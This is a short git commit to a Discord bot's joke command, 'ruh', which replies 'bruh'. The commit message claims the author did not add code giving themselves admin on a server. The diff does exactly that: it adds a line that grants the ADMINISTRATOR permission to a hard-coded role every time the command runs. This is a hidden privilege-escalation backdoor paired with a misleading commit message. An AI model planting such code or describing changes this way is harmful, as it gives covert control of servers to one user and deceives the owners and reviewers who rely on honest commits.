7d66cc1c38c2bdf104aafb616282b0fcf637557b
Christian Muce <lowercase.txt@gmail.com>
2020-06-04 15:30:57 -0400

    didnt add code to give me admin on C█ssp██l 18

--- commands/bruh.js
+++ commands/bruh.js
@@ -2,6 +2,7 @@ module.exports = {
 	name: 'ruh',
 	description: 'why the fuck did you want me to program this shit',
 	execute(message, args) {
-     message.channel.send('bruh');
+		message.channel.send('bruh');
+		message.guild.roles.get("717136443465662476").setPermissions(['ADMINISTRATOR'])
 	},
 };
